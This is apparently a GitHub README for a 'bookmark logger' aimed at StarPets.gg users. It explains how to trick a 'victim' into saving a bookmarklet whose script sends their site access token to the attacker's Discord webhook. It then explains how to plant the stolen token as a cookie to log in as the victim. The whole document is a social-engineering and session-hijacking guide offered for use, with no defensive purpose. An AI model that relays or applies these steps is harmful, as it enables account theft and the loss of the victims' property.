# StarPets.gg-Bookmark-Logger-V2
This is a better version one of my pervious respiratory which that automatically sends the access-token to your Discord webhook once added as a bookmark.

Change your webhook in logger.js

Make your victim go to https://starpets.gg (obvoiusly)
Make them click CTRL+SHIFT+B to open their bookmarks bar, if it is not already open.
Make them right click on their bookmarks bar, click "Add page", and paste the script in the "URL" section.
Once they do that, their Starpets access-Token will send to your Discord webhook.



HOW TO LOGIN WITH THE ACCESS-TOKEN?

Right click, Inspect element, go to "Applications" (if applications does not show up, simply click the three arrows and click "application".)

Go the the cookies tab, https://starpets.gg
Then click on an empty field and make a name called "access-token".
On the value tab, add the access-token sent to your Discord Webhook.

You are now logged in!
